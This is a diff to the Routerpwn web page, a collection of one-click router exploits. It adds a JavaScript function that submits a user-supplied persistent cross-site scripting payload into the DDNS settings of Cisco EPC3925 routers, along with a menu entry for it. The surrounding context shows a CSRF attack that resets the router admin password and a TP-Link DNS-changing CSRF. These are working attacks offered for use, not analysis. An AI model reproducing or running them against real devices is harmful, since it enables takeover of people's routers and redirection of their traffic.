@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.20.233</title>
+		<title>Routerpwn 1.20.234</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -745,6 +745,18 @@ function epc3925_changepassword(ip)
     form = '<input type="hidden" name="Password" value="attackers_password' + pwd + '"><input type="hidden" name="PasswordReEnter" value="' + pwd +'">\
     <input type="hidden" name="save" value="Save Settings">';
 	post('http://' + ip + '/goform/Quick_setup', form);
+}
+
+function epc3925_postxss(ip)
+{
+    ip = ip || "192.168.0.1";
+    xss = prompt("XSS Payload: ");
+    form = '<input type="hidden" name="DdnsService" value="0">\
+	<input type="hidden" name="Username" value="xxx">\
+    <input type="hidden" name="DdnsPassword" value="****">\
+    <input type="hidden" name="DdnsHostName" value="' + xss + '">\
+    <input type="hidden" name="save" value="Save Settings">';
+	post('http://' + ip + '/goform/Setup_DDNS', form);
 
 }
 
@@ -3021,6 +3033,13 @@ function belkinwpspin()
 
 <article>
 	<div>12/11/13</div>
+	<div><a href="http://www.exploit-db.com/exploits/30415/">[+]</a></div>
+	<div><a href="javascript:epc3925_postxss()">Cisco EPC3925 - Persistent Cross Site Scripting</a></div>
+	<div><a href="javascript:epc3925_postxss(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>12/11/13</div>
 	<div><a href="http://www.exploit-db.com/exploits/30362/">[+]</a></div>
 	<div><a href="javascript:epc3925_changepassword()">Cisco EPC3925 - Change Admin Password CSRF</a></div>
 	<div><a href="javascript:epc3925_changepassword(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
@@ -4480,7 +4499,7 @@ function belkinwpspin()
 </article>
 
 <article>
-	<div>10/30/13</div>
+	<div>30/10/13</div>
 	<div><a href="http://www.jakoblell.com/blog/2013/10/30/real-world-csrf-attack-hijacks-dns-server-configuration-of-tp-link-routers-2/">[+]</a></div>
 	<div><a href="javascript:wr1043nd_dnscsrf()">TP-Link WR1043ND - Change DNS CSRF</a></div>
 	<div><a href="javascript:wr1043nd_dnscsrf(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
